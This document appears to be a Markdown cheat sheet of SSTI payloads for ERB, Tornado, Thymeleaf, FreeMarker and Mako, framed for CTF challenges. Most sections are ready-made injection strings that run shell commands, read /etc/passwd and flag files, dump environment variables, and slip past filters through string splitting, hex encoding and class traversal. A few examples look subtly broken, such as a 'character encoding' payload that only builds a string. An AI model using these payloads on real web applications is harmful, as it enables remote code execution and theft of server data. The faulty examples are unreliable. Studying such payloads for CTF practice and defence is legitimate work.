# ERB - Ruby Template
SSTI (Server-Side Template Injection) on ERB (Embedded Ruby) is a common vulnerability in Ruby web applications. Here's how you can approach this in a CTF challenge:

## Understanding ERB SSTI

ERB (Embedded Ruby) is a templating system that embeds Ruby code in a document. When vulnerable to SSTI, you can execute arbitrary Ruby code.

## Common ERB SSTI Payloads

1. **Basic Testing**:
    
    ```
    <%= 7 * 7 %>
    ```
    
    If this returns 49, the application is vulnerable to SSTI.
    
2. **System Commands**:
    
    ```
    <%= `ls -la` %>
    <%= system('cat /etc/passwd') %>
    <%= IO.popen('id').read %>
    ```
    
3. **Ruby Code Execution**:
    
    ```
    <%= eval('puts File.read("/flag.txt")') %>
    <%= File.open('/flag.txt').read %>
    <%= Dir.entries('/') %>
    ```
    
4. **Ruby Object Methods to Enumerate Classes**:
    
    ```
    <%= Object.methods %>
    <%= self.class.ancestors %>
    <%= ObjectSpace.each_object(Class).to_a %>
    ```
    
5. **Kernel Module Exploitation**:
    
    ```
    <%= Kernel.exec('cat /flag.txt') %>
    <%= Kernel.system('ls -la') %>
    ```
    

## Bypass Techniques

If basic injection is filtered:

1. **Using Alternative Syntax**:
    
    ```
    <% require 'open3' %><%= Open3.capture2('cat /flag.txt') %>
    ```
    
2. **Object Traversal**:
    
    ```
    <%= [8].class.ancestors[1].ancestors[1].constants.find_all { |c| c =~ /File/ }[0].to_s.constantize.new('/flag.txt').read %>
    ```
    
3. **Breaking Up Strings**:
    
    ```
    <%= "cat"+" "+"/flag.txt" %>
    <%= eval("File.op"+"en('/flag.txt').read") %>
    ```
    
4. **Using Unicode/Hex Encoding**:
    
    ```
    <%= eval("\x73\x79\x73\x74\x65\x6d('cat /flag.txt')") %>
    ```
    
# SSTI for Tornado Templates (Python)

Tornado templates are Python-based templating engines often used with the Tornado web framework. Here's how to perform Server-Side Template Injection (SSTI) in Tornado templates for CTF challenges:

## Basic Testing

To confirm a Tornado template injection vulnerability:

```
{{ 7 * 7 }}
```

If this returns `49`, you've confirmed the vulnerability.

## Advanced Payloads

### Object Exploration

```
{{ handler }}
{{ handler.settings }}
{{ handler.application }}
{{ handler.__dict__ }}
{{ self }}
{{ globals() }}
```

### Accessing Python Builtins

```
{{ __builtins__ }}
{{ __builtins__.__dict__ }}
```

### File Reading

```
{{ open('/etc/passwd').read() }}
{{ open('/flag.txt').read() }}
{{ __import__('os').popen('cat /flag.txt').read() }}
```

### OS Command Execution

```
{{ __import__('os').popen('ls -la').read() }}
{{ __import__('os').system('id') }}
{{ __import__('subprocess').check_output(['cat', '/flag.txt']) }}
```

### Module Imports

```
{{ __import__('os').listdir('.') }}
{{ __import__('subprocess').check_output(['ls', '-la']) }}
```

## Bypass Techniques

### Using alternative syntax:

```
{% set x = 'os' %}
{% set os = __import__(x) %}
{{ os.popen('cat /flag.txt').read() }}
```

### Using alternative functions:

```
{{ handler.settings.get('compiled_template_cache', {}).items() }}
{{ [x for x in ().__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0].__init__.__globals__['__builtins__']['__import__']('os').popen('id').read() }}
```

### Template engine bypass:

```
{% raw %}
{% include '/etc/passwd' %}
{% end %}
```

### Context escaping:

```
{% for x in [].__class__.__base__.__subclasses__() %}
    {% if 'warning' in x.__name__ %}
        {{ x.__init__.__globals__['__builtins__'].open('/flag.txt').read() }}
    {% end %}
{% end %}
```

# SSTI for Thymeleaf (Java) Templates

Thymeleaf is a modern server-side Java template engine for web applications. Here's how to perform Server-Side Template Injection (SSTI) on Thymeleaf in a CTF context:

## Basic Testing

Test for vulnerability with:

```
${7*7}
*{7*7}
```

If this returns `49`, you have confirmed the vulnerability.

## Expression Types in Thymeleaf

Thymeleaf has multiple expression syntaxes:

- `${...}` - Variable expressions (OGNL/SpringEL)
- `*{...}` - Selection expressions
- `@{...}` - Link expressions
- `#{}` - Message expressions
- `~{}` - Fragment expressions

## Exploitation Techniques

### Basic Expression Evaluation

```
${7*7}
${T(java.lang.System).getProperty('user.dir')}
```

### Class Loading and Reflection

```
${T(java.lang.Runtime).getRuntime().exec('id')}
${T(java.lang.Runtime).getRuntime().exec('cat /flag.txt')}
```

### Using String Concatenation (for filter bypass)

```
${T(String).valueOf(T(java.lang.Runtime).getRuntime().exec('cat /etc/passwd'))}
```

### Reading Files

```
${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('cat /flag.txt').getInputStream())}
```

### Environment Information

```
${T(java.lang.System).getenv()}
${T(java.lang.System).getProperties()}
```

### Using ClassLoader

```
${T(java.lang.Class).forName('java.lang.Runtime').getRuntime().exec('cat /flag.txt')}
```

### Object Instantiation

```
${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec('cat /flag.txt').getInputStream()).next()}
```

## Advanced Payloads

### Process Output Capture

```
${T(org.springframework.util.StreamUtils).copyToString(T(java.lang.Runtime).getRuntime().exec('cat /flag.txt').getInputStream(), T(java.nio.charset.StandardCharsets).UTF_8)}
```

### Using Java Reflection

```
${#rt = T(java.lang.Runtime).getRuntime(),#rt.exec('cat /flag.txt')}
```

### SpEL Context Variables (Spring-specific)

```
${#strings.contains(#rt.exec('cat /flag.txt'),'flag')}
```

## Bypass Techniques

### String Manipulation

```
${''.getClass().forName('java.lang.Ru'+'ntime').getRuntime().exec('cat /flag.txt')}
```

### Character Encoding

```
${T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(' /flag.txt')}
```

### Indirect Method Access

```
${#s=(#rt=@java.lang.Runtime@getRuntime()).getClass().getDeclaredMethods()[15],#s.setAccessible(true),#s.invoke(#rt,'cat /flag.txt')}
```

## Practical Approach for CTFs

1. **Confirm the vulnerability**:
    
    - Test with simple expressions like `${7*7}`
2. **Explore the environment**:
    
    - Get system properties with `${T(java.lang.System).getProperties()}`
    - List directories with `${T(java.lang.Runtime).getRuntime().exec('ls -la').inputStream.text}`
3. **Read sensitive files**:
    
    - Try to read `/flag.txt`, `flag.txt` or other CTF-specific files
4. **Execute commands** to find and read the flag:
    
    - Use `${T(java.lang.Runtime).getRuntime().exec('find / -name flag.txt 2>/dev/null').inputStream.text}`

Remember that actual payloads might need to be adapted based on the specific Thymeleaf version, Spring configuration, and security constraints in the target application.

# SSTI for FreeMarker Java Templates

FreeMarker is a popular template engine for Java applications. Here's how to exploit Server-Side Template Injection (SSTI) vulnerabilities in FreeMarker for CTF challenges:

## Basic Testing

Test for vulnerability with:

```
${7*7}
<#assign x=7*7>${x}
```

If this returns `49`, you have a FreeMarker SSTI vulnerability.

## Core Exploitation Techniques

### Basic Expression Evaluation

```
${3*4}
${1+2}
```

### Variable Assignment

```
<#assign test="freemarker">
${test}
```

### Object Introspection

```
${object}
${object?api}
```

### Access to Java Objects

```
${.version}
${.globals}
${.main}
```

### File Operations

```
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("cat /etc/passwd")}
${new java.io.BufferedReader(new java.io.FileReader("/flag.txt")).readLine()}
```

### Command Execution

```
<#assign cmd="freemarker.template.utility.Execute"?new()>${cmd("id")}
<#assign cmd="freemarker.template.utility.Execute"?new()>${cmd("cat /flag.txt")}
```

## Advanced Techniques

### Using the Built-in Execute Utility

```
<#assign ex = "freemarker.template.utility.Execute"?new()>
${ex("cat /flag.txt")}
```

### Class Loading

```
${object?api.class.protectionDomain.classLoader.loadClass("java.lang.Runtime").getRuntime().exec("cat /flag.txt")}
```

### Java Reflection

```
<#assign classloader=object?api.class.protectionDomain.classLoader>
<#assign cls=classloader.loadClass("java.lang.Runtime")>
<#assign method=cls?api.methods[6]>
${method.invoke(cls?api.methods[7].invoke(null),"/bin/sh,-c,cat /flag.txt"?split(","))}
```

### Object Traversal for Bypass

```
${object.getClass().getClassLoader().loadClass("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("cat /flag.txt")}
```

## Bypass Techniques

### String Concatenation

```
<#assign c="java.lang.Runtime"?new().exec("c"+"at /flag.txt")>
```

### Alternative Method Invocation

```
<#assign classloader=1?api.class.protectionDomain.classLoader>
<#assign cls=classloader.loadClass("java.lang.Runtime")>
<#assign r=cls.getRuntime()>
${r.exec("cat /flag.txt")}
```

### Using JNI

```
${Runtime.getRuntime().loadLibrary("path_to_library")}
```

## Practical Approach for CTFs

1. **Verify the injection point**:
    
    - Test with `${7*7}` to confirm template execution
2. **Check for restrictions**:
    
    - Some environments restrict `Execute` or direct command execution
    - Try different techniques based on restrictions
3. **Explore the environment**:
    
    - Use `${.globals}` to see available objects
    - Use `${.version}` to identify FreeMarker version
4. **Read the flag**:
    
    - Direct approach: `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("cat /flag.txt")}`
    - File reading: `${new java.io.BufferedReader(new java.io.FileReader("/flag.txt")).readLine()}`

Remember that in CTF challenges, the flag might be in a non-standard location, so enumeration is key. Try listing directories with commands like `ls -la` before targeting specific files.

# SSTI for Mako Templates (Python)

Mako is a template library written in Python, often used with web frameworks like Pylons and Pyramid. Here's how to exploit Server-Side Template Injection (SSTI) vulnerabilities in Mako templates for CTF challenges:

## Basic Testing

To verify a Mako SSTI vulnerability:

```
${7 * 7}
```

If it returns `49`, you have a Mako template injection vulnerability.

## Basic Exploitation Techniques

### Expression Evaluation

```
${7 * 7}
${len('hello')}
${"hello" + " world"}
```

### Accessing Python Objects

```
${dir()}
${locals()}
${globals()}
${self.__dict__}
```

### Code Execution (Mako-specific)

```
<%
    import os
    x = os.popen('id').read()
%>
${x}
```

### One-liner Commands

```
${__import__('os').popen('id').read()}
${__import__('os').popen('cat /etc/passwd').read()}
${__import__('os').popen('cat /flag.txt').read()}
```

## Advanced Techniques

### Using Python Blocks

```
<%
    import os
    os.system('cat /flag.txt')
%>
```

### Function Definition

```
<%def name="exploit()">
    <% 
        import os
        return os.popen('cat /flag.txt').read()
    %>
</%def>
${exploit()}
```

### Using Namespaces

```
<%
    __M_writer=__import__('os').popen('cat /flag.txt').read
%>
${__M_writer()}
```

### Context Manipulation

```
<% 
    context.write(__import__('os').popen('cat /flag.txt').read())
%>
```

## Bypass Techniques

### Module Import Alternatives

```
${[x for x in ().__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0].__init__.__globals__['__builtins__']['__import__']('os').popen('cat /flag.txt').read()}
```

### String Concatenation

```
${__import__('o'+'s').popen('cat /flag.txt').read()}
```

### Using Evaluated Code

```
${eval("__import__('os').popen('cat /flag.txt').read()")}
```

### Using Exec

```
<% exec("import os; x=os.popen('cat /flag.txt').read()") %>
${x}
```

## Practical Approach for CTFs

1. **Test for vulnerability**:
    
    - Use simple expressions like `${7*7}`
    - If evaluated, proceed with more complex payloads
2. **Explore the environment**:
    
    - List directories: `${__import__('os').popen('ls -la').read()}`
    - Check current user: `${__import__('os').popen('whoami').read()}`
3. **Find and read the flag**:
    
    - Search for flag: `${__import__('os').popen('find / -name "flag*" 2>/dev/null').read()}`
    - Read flag: `${__import__('os').popen('cat /flag.txt').read()}`
4. **If restricted**:
    
    - Try different ways to execute commands (subprocess, commands, etc.)
    - Use object traversal to bypass filters

Remember that in CTF scenarios, flag files may be named differently or located in non-standard directories, so enumeration is essential for success.